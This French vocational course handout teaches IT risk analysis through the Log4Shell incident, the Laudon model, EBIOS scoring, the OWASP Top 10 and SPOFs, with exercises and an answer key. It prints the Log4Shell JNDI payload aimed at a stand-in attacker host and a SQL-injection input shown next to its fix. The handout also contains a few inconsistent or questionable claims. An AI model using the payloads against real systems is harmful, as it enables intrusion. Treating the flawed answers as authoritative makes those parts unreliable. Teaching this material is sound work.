# SUPPORT DE COURS
## Séance 1 – Cartographier la vulnérabilité
### Analyse de risques et cybersécurité du SI

**BTS SIO – Bloc 1 & 3 – Cybersécurité des services informatiques **

---

## 📋 SOMMAIRE

1. [Étude de cas : L'incident Log4Shell](#1-étude-de-cas--lincident-log4shell)
2. [Les 5 composants du Système d'Information (Laudon)](#2-les-5-composants-du-système-dinformation)
3. [Vulnérabilité, Menace, Risque : les fondamentaux](#3-vulnérabilité-menace-risque--les-fondamentaux)
4. [La méthode EBIOS simplifiée](#4-la-méthode-ebios-simplifiée)
5. [OWASP Top 10 — Les 10 failles applicatives les plus graves](#5-owasp-top-10--les-10-failles-applicatives)
6. [Le concept de SPOF (Single Point of Failure)](#6-le-concept-de-spof)
7. [Introduction à la cybersécurité applicative](#7-introduction-à-la-cybersécurité-applicative)
8. [Exercices d'application](#8-exercices-dapplication)

---

# 1. ÉTUDE DE CAS : L'INCIDENT LOG4SHELL

## 1.1 Contexte de l'incident

Le **10 décembre 2021**, une **vulnérabilité critique** a été découverte dans Log4j, une librairie de journalisation utilisée par des **millions d'applications Java**.

> 📘 **Log4j**
> 
> Librairie open-source très populaire pour la journalisation (enregistrement) des événements dans les applications Java. Utilisée par Minecraft, Netflix, Apple, etc.

## 1.2 Chronologie des événements

| Date | Événement |
|------|-----------|
| 10 décembre 2021 | Alerte publique sur CVE-2021-44228 |
| 10-12 décembre | Exploitations massives observées |
| 15 décembre | Patch de sécurité critique fourni par Apache |
| Décembre - Janvier | Chasse aux instances vulnérables en production |

## 1.3 Impact mondial

| Indicateur | Valeur | Détail |
|-----------|--------|--------|
| Serveurs affectés | **Millions** | Toute application Java utilisant Log4j |
| Gravité | **CRITIQUE** | Exécution de code à distance (RCE) |
| Délai de patch | **24-48h max** | Urgence absolue |
| Organisations touchées | **Fortune 500** | Apple, Google, Amazon, Microsoft Cloud, etc. |

> 💡 **Organisations touchées**
> 
> Minecraft (milliards de joueurs en ligne), Netflix, Apple iCloud, Steam, Amazon Web Services, Microsoft Azure.

## 1.4 Analyse de la cause

Une **faille dans la librairie Log4j** permettait d'exécuter du code malveillant simplement en envoyant une certaine chaîne de caractères :

```
${jndi:ldap://attaquant.com/a}
```

Si cette chaîne se retrouvait dans les logs de l'application, elle était exécutée.

> 🔐 À RETENIR
> 
> Une librairie populaire et "simple" peut contenir une faille catastrophale. Aucune dépendance n'est "sûre" par défaut.

## 1.5 Leçons à retenir

- Les **dépendances open-source** sont partout (supply chain risk)
- Une seule faille dans une librairie populaire = catastrophe mondiale
- La **gestion des patchs** est critique pour la sécurité
- Le monitoring et la détection des exploitations sont essentiels
- La **culture du patch** doit être imédiate pour les CRITIQUES

---

# 2. LES 5 COMPOSANTS DU SYSTÈME D'INFORMATION

## 2.1 Le modèle de Laudon & Laudon

Kenneth et Jane Laudon proposent une vision **systémique** du SI articulée autour de **5 composants interdépendants**.

> 📘 **Système d'Information (SI)**
> 
> Ensemble organisé de ressources (matériel, logiciel, données, procédures, personnel) permettant de collecter, stocker, traiter et diffuser l'information au sein d'une organisation.

## 2.2 Les 5 composants détaillés

| Composant | Description | Exemples concrets |
|-----------|-------------|-------------------|
| **M - Matériel** | Infrastructure physique | Serveurs, postes, câblage, onduleurs |
| **L - Logiciel** | Programmes et applications | OS, frameworks, librairies (Log4j), antivirus |
| **D - Données** | Informations stockées | Bases de données, fichiers, sauvegardes, logs |
| **P - Procédures** | Règles et processus | Politiques de sécurité, workflows, documentation |
| **H - Humain** | Ressources humaines | Développeurs, DevOps, utilisateurs, support |

> 🔑 **Mnémonique**
> 
> **MLDPH** = "Ma Ligne De Protection Humaine"
> 
> Ou simplement : Matériel - Logiciel - Données - Procédures - Human

## 2.3 L'interdépendance des composants

Le point crucial du modèle Laudon est l'**interdépendance** : chaque composant dépend des autres.

```
        🖥️ MATÉRIEL
             ↕️
        💾 LOGICIEL
             ↕️
        📊 DONNÉES
             ↕️
   📋 PROCÉDURES  ↔️  👥 HUMAIN

   Tous interconnectés : une défaillance 
   sur l'un impacte les autres
```

> 💡 **Exemple d'interdépendance (Log4Shell)**
> 
> Une faille LOGICIEL (Log4j) peut compromettre les DONNÉES (données clients), rendre le MATÉRIEL inutilisable, bloquer les PROCÉDURES (applications down), et rendre le HUMAIN inactif.

## 2.4 Application à l'analyse de risques

Pour analyser la sécurité d'une app, il faut examiner **CHAQUE composant** :

- Le matériel est-il suffisant et maintenu ?
- Les logiciels et dépendances sont-ils à jour ?
- Les données sont-elles chiffrées et sauvegardées ?
- Les procédures de sécurité sont-elles documentées ?
- Le personnel est-il formé à la sécurité du code ?

---

# 3. VULNÉRABILITÉ, MENACE, RISQUE : LES FONDAMENTAUX

## 3.1 Définitions essentielles

> 📘 **Vulnérabilité**
> 
> **Faiblesse** d'un système qui pourrait être exploitée. C'est une caractéristique **intrinsèque** du système.
> 
> *Exemple : Log4j sans patch, mot de passe faible, absence de validation des entrées.*

> 📘 **Menace**
> 
> Événement potentiel qui pourrait **exploiter une vulnérabilité** et causer un dommage. C'est **externe** au système.
> 
> *Exemple : un hacker, une attaque, un utilisateur malveillant, un bot.*

> 📘 **Risque**
> 
> Combinaison de la **probabilité** qu'une menace exploite une vulnérabilité et de l'**impact** qui en résulterait.
> 
> *Risque = Vulnérabilité + Menace + Impact potentiel*

## 3.2 La relation entre les concepts

Ces trois concepts sont liés par une **chaîne causale** :

```
┌─────────────────────────────────────────────────────────────┐
│ VULNÉRABILITÉ → exploitée par → MENACE → cause → IMPACT = RISQUE │
└─────────────────────────────────────────────────────────────┘
```

## 3.3 Exemples concrets

| Vulnérabilité | Menace | Impact | Risque |
|---------------|--------|--------|--------|
| Log4j sans patch | Hacker exploitant CVE | Prise de contrôle de l'app | **CRITIQUE** |
| Mot de passe faible | Attaque brute force | Accès aux données clients | **ÉLEVÉ** |
| Pas de validation | Injection SQL | Lecture/modification BDD | **CRITIQUE** |
| Dépendance outdated | Exploitation d'une faille | Compromission du code | **ÉLEVÉ** |
| Absence de chiffrage | Interception en transit | Vol de données | **ÉLEVÉ** |

> ⚠️ **Attention**
> 
> Une vulnérabilité sans menace associée n'est pas un risque. Une vieille version de Log4j sur une machine isolée n'est pas un risque.

## 3.4 Formule du risque

```
┌──────────────────────────────────────────┐
│   RISQUE = VRAISEMBLANCE × IMPACT        │
└──────────────────────────────────────────┘
```

- **Vraisemblance** : probabilité que la menace exploite la vulnérabilité
- **Impact** : gravité des conséquences si le risque se réalise

---

# 4. LA MÉTHODE EBIOS SIMPLIFIÉE

## 4.1 Présentation d'EBIOS

> 📘 **EBIOS Risk Manager**
> 
> Méthode **française** officielle d'analyse de risques, recommandée par l'ANSSI (Agence Nationale de la Sécurité des Systèmes d'Information).

## 4.2 Les 4 étapes d'EBIOS

```
Étape 1 : Identifier les vulnérabilités
          ↓
Étape 2 : Évaluer la vraisemblance (V)
          "Facile à exploiter ?"
          ↓
Étape 3 : Évaluer l'impact (I)
          "Grave si exploitée ?"
          ↓
Étape 4 : Calculer le RISQUE = V × I
          et prioriser les actions
```

## 4.3 Scoring de la vraisemblance (V)

| Score | Description | Exemple |
|-------|-------------|---------|
| 🟢 **1** | Très difficile à exploiter | Faille théorique, nécessite conditions rares |
| 🟡 **2** | Difficile | Exploitation possible mais complexe |
| 🟠 **3** | Facile | Exploitation simple, peu de compétences |
| 🔴 **4** | Très facile | Visible, automatisable, public |

**Pour Log4j sans patch :**
- V = 4 (très facile, exploit public disponible)

## 4.4 Scoring de l'impact (I)

| Score | Description | Exemple |
|-------|-------------|---------|
| 🟢 **1** | Mineur | Dégradation service, impact limité |
| 🟡 **2** | Modéré | Service partiellement affecté |
| 🟠 **3** | Majeur | Service interrompu, données affectées |
| 🔴 **4** | Critique | Perte de contrôle, données compromises |

**Pour Log4j avec RCE :**
- I = 4 (exécution de code = perte totale de contrôle)

## 4.5 Matrice de risque EBIOS

```
                    Impact
        1    2    3    4
V 1  │  1    2    3    4
V 2  │  2    4    6    8
V 3  │  3    6    9   12
V 4  │  4    8   12   16
```

**Interprétation :**
- 🟢 1-3 : Risque faible → Surveiller
- 🟡 4-7 : Risque modéré → Améliorer dans 3-6 mois
- 🟠 8-11 : Risque élevé → Améliorer dans 1 mois
- 🔴 12-16 : Risque CRITIQUE → ACTION IMMÉDIATE

**Log4j : 4 × 4 = 16 → CRITIQUE**

---

# 5. OWASP TOP 10 — LES 10 FAILLES APPLICATIVES LES PLUS GRAVES

OWASP = Open Web Application Security Project (organisation de référence)

## 5.1 Les 10 catégories (2021)

| # | Catégorie | Description | Exemple |
|---|-----------|-------------|---------|
| **A01** | **Broken Access Control** | On accède à quelque chose sans permission | Lire les données d'un autre client |
| **A02** | **Cryptographic Failures** | Données non protégées (pas HTTPS, clair, etc) | Mots de passe en clair |
| **A03** | **Injection** | On rentre du code dans un formulaire | SQL injection, commandes |
| **A04** | **Insecure Design** | Architecture mal pensée | API sans authentification |
| **A05** | **Security Misconfiguration** | Mal configuré | Debug mode actif, fichiers publics |
| **A06** | **Vulnerable Components** | Dépendances outdated | Log4j sans patch |
| **A07** | **Identification Failures** | Authentification faible | Mot de passe facile |
| **A08** | **Software & Data Integrity Failures** | Pas de signature/vérification | Modification en transit |
| **A09** | **Logging & Monitoring Failures** | Pas de traçabilité | On sait pas qui a fait quoi |
| **A10** | **SSRF** | Force l'app à accéder à des ressources internes | Accéder à AWS metadata |

## 5.2 Focus sur A06 : Vulnerable Components

**C'est la catégorie de Log4Shell !**

```
Les risques :
├─ Utiliser des librairies populaires (moins surveillées = failles)
├─ Ne pas mettre à jour les dépendances
├─ Ne pas scanner les dépendances (npm audit, mvn dependency-check)
└─ Faire confiance aveugle aux dépendances

Solutions :
├─ Audit régulier des dépendances
├─ Mise à jour automatique des correctifs
├─ Scanning de sécurité dans le CI/CD
├─ Inventaire des dépendances
└─ Monitoring des alertes de sécurité
```

## 5.3 Focus sur A03 : Injection SQL

**Faille très commune en développement**

```javascript
// ❌ DANGEREUX : Injection SQL possible
const id = req.query.id;
const query = `SELECT * FROM users WHERE id = ${id}`;
// Attaquant envoie : id = 1 OR 1=1 --
// Requête devient : SELECT * FROM users WHERE id = 1 OR 1=1 --
// RÉSULTAT : Tous les utilisateurs sont lus !

// ✅ SÉCURISÉ : Utiliser des requêtes paramétrées
const query = `SELECT * FROM users WHERE id = ?`;
db.execute(query, [id]);
// Le ? est remplacé de manière sûre
```

---

# 6. LE CONCEPT DE SPOF

## 6.1 Définition

> 📘 **SPOF = Single Point Of Failure**
> 
> Composant critique dont si elle échoue, **tout s'arrête**.

## 6.2 Exemples dans une app

```
SPOF CRITIQUES :
├─ Une seule instance serveur
│  (pas de load balancing, pas de failover)
│
├─ Une seule base de données
│  (pas de réplication, pas de backup)
│
├─ Un seul développeur avec la "connaissance"
│  (documentation = 0)
│
├─ Dépendance externe indispensable
│  (Log4j pour les logs, CrowdStrike pour la sécu)
│
└─ Clé API ou secret en dur dans le code
   (stockée en clair = risque énorme)
```

## 6.3 Comment identifier un SPOF

**Se demander : "Si [composant] échoue, qu'est-ce qui arrive ?"**

- Si la réponse est "tout s'arrête" → **SPOF**
- Si la réponse est "on bascule sur le backup" → **OK**

## 6.4 Solutions contre les SPOF

| SPOF | Solution |
|------|----------|
| Serveur unique | Ajouter replicas, load balancer |
| BDD unique | Réplication master-slave ou cluster |
| Dépendance critique | Alternatives, plans B, monitoring |
| Personne unique | Documentation, formation, croiser les connaissances |
| Secrets en dur | Coffre-fort de secrets (Vault, AWS Secrets Manager) |

---

# 7. INTRODUCTION À LA CYBERSÉCURITÉ APPLICATIVE

## 7.1 Sécurité dès la conception (Secure by Design)

La sécurité doit être pensée **dès le départ**, pas ajoutée après.

```
❌ Mauvais : Développer → Tester → Dire "c'est sécurisé"
✅ Bon : Penser sécurité → Coder sécurisé → Tester → Déployer

Ça inclut :
├─ Threat modeling (anticiper les attaques)
├─ Code review avec l'angle sécurité
├─ Tests de sécurité (SAST, DAST)
├─ Gestion des secrets
└─ Monitoring des anomalies
```

## 7.2 Bonnes pratiques en développement

```
✅ FAIRE :
├─ Valider TOUTES les entrées utilisateur
├─ Utiliser des requêtes paramétrées (pas de concat SQL)
├─ Chiffrer les données sensibles
├─ Utiliser HTTPS partout
├─ Garder les secrets en dehors du code
├─ Mettre à jour les dépendances régulièrement
├─ Implémenter du logging (traçabilité)
├─ Tester la sécurité (pentesting)
└─ Documenter les décisions de sécurité

❌ NE PAS FAIRE :
├─ Faire confiance aux données utilisateur
├─ Concaténer du SQL
├─ Stocker les mots de passe en clair
├─ Utiliser HTTP pour les données sensibles
├─ Laisser les secrets dans le code
├─ Ignorer les mises à jour de dépendances
├─ Déployer sans tests
└─ Cacher les erreurs aux utilisateurs
```

## 7.3 Processus de sécurité en équipe

```
1. THREAT MODELING
   "Qu'est-ce qu'un attaquant pourrait faire ?"
   
2. SECURE DESIGN
   "Comment on la construit sécurisée ?"
   
3. SECURE CODE
   "On code avec les bonnes pratiques"
   
4. CODE REVIEW
   "Pair programming avec angle sécurité"
   
5. TESTS DE SÉCURITÉ
   "SAST (static), DAST (dynamic), Pen Testing"
   
6. MONITORING
   "Détecter les anomalies en production"
   
7. INCIDENT RESPONSE
   "Si attaque, réagir rapidement"
```

---

# 8. EXERCICES D'APPLICATION

## Exercice 1 : Identifier les composants Laudon dans une app

Pour chaque élément ci-dessous, indiquez le composant du SI correspondant (M, L, D, P ou H) :

| Élément | Composant |
|---------|-----------|
| Un serveur NodeJS | _____ |
| La base de données PostgreSQL | _____ |
| La librairie Log4j | _____ |
| La procédure de deployment | _____ |
| Le développeur backend | _____ |
| Les fichiers de logs | _____ |
| Le système d'exploitation Linux | _____ |
| La politique de gestion des mots de passe | _____ |

---

## Exercice 2 : Distinguer vulnérabilité et menace

Pour chaque situation, identifiez la vulnérabilité et la menace :

**a) Log4Shell (sans patch) et un attaquant qui exploite**

- Vulnérabilité : ______________________________________
- Menace : ______________________________________

**b) Un dev stocke un mot de passe en dur, quelqu'un lit le code source**

- Vulnérabilité : ______________________________________
- Menace : ______________________________________

**c) Une injection SQL : pas de validation d'entrée, attaquant envoie du SQL**

- Vulnérabilité : ______________________________________
- Menace : ______________________________________

---

## Exercice 3 : Calcul de risque EBIOS

Évaluez le niveau de risque pour chaque situation (V × I) :

| Situation | V (1-4) | I (1-4) | Risque | Niveau |
|-----------|---------|---------|--------|--------|
| Log4j sans patch hébergeant données clients | | | | |
| Dépendance npm à jour | | | | |
| Secret d'API en dur dans le code | | | | |
| Validation des entrées correctement faite | | | | |
| Pas de HTTPS sur formulaire login | | | | |

---

## Exercice 4 : Identifier les SPOF dans une app

Identifiez les SPOF potentiels et proposez une solution :

| Élément | SPOF ? | Solution |
|---------|--------|----------|
| Une seule instance serveur Node | | |
| Clé API stockée dans .env.production | | |
| Un seul développeur connait auth | | |
| Cache Redis avec failover automatique | | |
| Dépendance npm sans alternative | | |

---

## Exercice 5 : Classification OWASP

Pour chaque vulnérabilité, identifiez la catégorie OWASP correspondante :

| Vulnérabilité | Catégorie OWASP |
|---|---|
| Log4j vulnerability (RCE) | _____ |
| Mot de passe en clair en BDD | _____ |
| Injection SQL | _____ |
| API sans authentification | _____ |
| Dépendance npm outdated | _____ |

---

# CORRIGÉ DES EXERCICES

## Exercice 1 : Corrigé

| Élément | Composant |
|---------|-----------|
| Un serveur NodeJS | **M** (Matériel) |
| La base PostgreSQL | **D** (Données) |
| La librairie Log4j | **L** (Logiciel) |
| Procédure deployment | **P** (Procédures) |
| Développeur backend | **H** (Human) |
| Fichiers de logs | **D** (Données) |
| Système d'exploitation Linux | **L** (Logiciel) |
| Politique mots de passe | **P** (Procédures) |

---

## Exercice 2 : Corrigé

**a)**
- Vulnérabilité : Log4j contient une faille RCE
- Menace : Attaquant exploit cette faille

**b)**
- Vulnérabilité : Secret en dur dans le code
- Menace : Quelqu'un accède au code source

**c)**
- Vulnérabilité : Pas de validation des entrées
- Menace : Attaquant envoie du SQL malveillant

---

## Exercice 3 : Corrigé indicatif

| Situation | V | I | Risque | Niveau |
|-----------|---|---|--------|--------|
| Log4j sans patch | 4 | 4 | 16 | 🔴 CRITIQUE |
| npm à jour | 1 | 1 | 1 | 🟢 FAIBLE |
| Secret en dur | 4 | 4 | 16 | 🔴 CRITIQUE |
| Validation OK | 1 | 1 | 1 | 🟢 FAIBLE |
| Pas HTTPS | 3 | 3 | 9 | 🟠 ÉLEVÉ |

---

## Exercice 4 : Corrigé

| Élément | SPOF | Solution |
|---------|------|----------|
| Serveur unique | **OUI** | Ajouter replicas + load balancer |
| Clé API en dur | **OUI** | Secrets manager (Vault, AWS Secrets) |
| Dev unique auth | **OUI** | Documentation, formation, pair coding |
| Redis failover | NON | Déjà protégé |
| npm sans alt | **OUI** | Chercher alternatives, faire code custom |

---

## Exercice 5 : Corrigé

| Vulnérabilité | Catégorie OWASP |
|---|---|
| Log4j RCE | **A06** (Vulnerable Components) |
| Mot de passe clair | **A02** (Cryptographic Failures) |
| Injection SQL | **A03** (Injection) |
| API sans auth | **A07** (Identification Failures) |
| npm outdated | **A06** (Vulnerable Components) |

---

---

*BTS SIO - Bloc 1 & 3 - Cybersécurité et Résilience - Support de cours - SLAM*
